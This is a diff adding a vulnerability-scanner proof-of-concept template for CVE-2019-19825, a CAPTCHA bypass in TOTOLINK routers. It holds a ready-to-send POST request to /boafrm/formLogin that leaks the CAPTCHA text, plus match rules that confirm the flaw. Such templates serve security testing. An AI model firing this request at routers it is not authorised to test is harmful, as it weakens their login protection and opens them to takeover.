@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "TOTOLINK Realtek SDK 路由器存在认证绕过漏洞，攻击者可通过向 boafrm/formLogin URI 发送包含 topicurl=setting/getSanvas 的 POST 请求获取 CAPTCHA 验证码文本，从而绕过验证码保护机制。在获取有效凭据后，攻击者无需验证码即可通过 HTTP 基本认证执行路由器管理操作，导致设备完全失控。"
+id = "POC-AVE-2019-0149"
+name = "CVE-2019-19825 PoC"
+severity = "critical"
+tags = ["ave-2019-0149"]
+vuln_id = [
+    "CVE-2019-19825",
+    "AVE-2019-0149",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/boafrm/formLogin"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"topicurl":"setting/getSanvas"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["captcha"]
